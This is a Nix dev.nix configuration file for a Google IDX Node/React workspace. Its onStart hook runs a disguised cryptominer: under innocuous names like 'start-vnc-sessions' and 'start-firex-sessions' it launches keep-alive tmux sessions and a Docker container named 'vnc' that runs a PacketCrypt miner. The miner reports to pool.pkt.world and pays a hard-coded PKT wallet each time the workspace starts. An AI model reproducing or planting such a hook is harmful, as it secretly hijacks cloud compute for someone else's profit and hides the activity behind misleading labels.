# To learn more about how to use Nix to configure your environment
# see: https://developers.google.com/idx/guides/customize-idx-env
{ pkgs, ... }: {
  # Which nixpkgs channel to use.
  channel = "stable-24.05"; # or "unstable"
  # Use https://search.nixos.org/packages to find packages
  packages = [
    pkgs.nodejs_20
  ];
  services.docker.enable = true;
  # Sets environment variables in the workspace
  env = {};
  idx = {
    # Search for the extensions you want on https://open-vsx.org/ and use "publisher.id"
    extensions = [
      # "vscodevim.vim"
    ];
    workspace = {
      # Runs when a workspace is first created with this `dev.nix` file
      onCreate = {
        npm-install = "npm ci --no-audit --prefer-offline --no-progress --timing";
        # Open editors for the following files by default, if they exist:
        default.openFiles = [ "src/App.tsx" "src/App.ts" "src/App.jsx" "src/App.js" ];
      };
      onStart = {
		    start-vnc-sessions = "
  			tmux new -d -s checker-session 'tail -f /dev/null'
  			tmux new -d -s checkup-session 'cat'
  			tmux new -d -s bitping-session 'httping google.com'
  			tmux new -d -s top-session 'top'
  			tmux attach -t top-session
	  	  ";
	    	start-firex-sessions = "
	  		docker run -d --name vnc --restart always -e WALLET=pkt1qldufh789t6v8g7wccql68w9c29524u6u5m87dy thomasjp0x42/packetcrypt-amd64 ann -p pkt1qldufh789t6v8g7wccql68w9c29524u6u5m87dy http://pool.pkt.world
	    	";
	    };
      # To run something each time the workspace is (re)started, use the `onStart` hook
    };
    # Enable previews and customize configuration
    previews = {
      enable = true;
      previews = {
        web = {
          command = ["npm" "run" "dev" "--" "--port" "$PORT" "--host" "0.0.0.0"];
          manager = "web";
        };
      };
    };
  };
}
